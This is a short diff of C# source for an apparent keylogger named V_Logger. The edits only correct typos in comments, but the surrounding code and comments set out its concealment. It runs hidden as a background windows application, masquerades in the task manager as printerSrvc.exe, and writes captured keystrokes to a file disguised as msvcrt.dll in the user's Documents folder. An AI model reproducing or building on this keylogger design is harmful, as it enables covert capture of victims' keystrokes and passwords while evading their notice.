@@ -11,7 +11,7 @@ namespace V_Logger
     {
         //Set the application properties to windows application, then the program remain hidden in background.
         //you can shut down it in the task manager, finding its name
-        //set assembly name and default namespace : printerSrvc so the file in the task manager appeas as printerSrvc.exe
+        //set assembly name and default namespace : printerSrvc so the file in the task manager appears as printerSrvc.exe
 
 
         [DllImport("User32.dll")]
@@ -28,7 +28,7 @@ namespace V_Logger
             //reaching folder Documents
             string filePath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
 
-            //setting the filder and filename.
+            //setting the folder and filename.
             string path = (filePath + @"\msvcrt.dll"); //saving strokes into a dll file it wont attach attention... maybe :)
 
             //check if the directory not exists, if not then create it.
